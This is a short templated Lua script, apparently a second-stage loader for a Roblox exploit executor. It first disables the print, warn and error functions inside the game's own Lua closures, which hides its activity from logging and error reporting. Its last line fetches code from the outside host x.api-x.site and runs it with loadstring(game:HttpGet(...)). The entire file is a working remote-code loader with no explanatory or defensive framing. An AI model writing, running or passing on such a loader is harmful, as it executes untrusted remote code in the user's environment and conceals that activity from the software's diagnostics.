if not _G.v or _G.v[1]~='s1'then return end
if '${f}'=='F'then
  local function sf(f)
    pcall(function()
      for i=1,debug.getinfo(f).nups do
        local n,v=debug.getupvalue(f,i)
        if n=='print'or n=='warn'or n=='error'then
          debug.setupvalue(f,i,function()end)
        end
      end
    end)
  end
  for _,v in pairs(getgc())do
    if type(v)=="function"and islclosure(v)and not is_synapse_function(v)then
      sf(v)
    end
  end
end
table.insert(_G.v,'s2')
local n=string.format("https://x.api-x.site?i=%s&s=%d&f=%s",'${i}',${s},'${f}')
loadstring(game:HttpGet(n))()
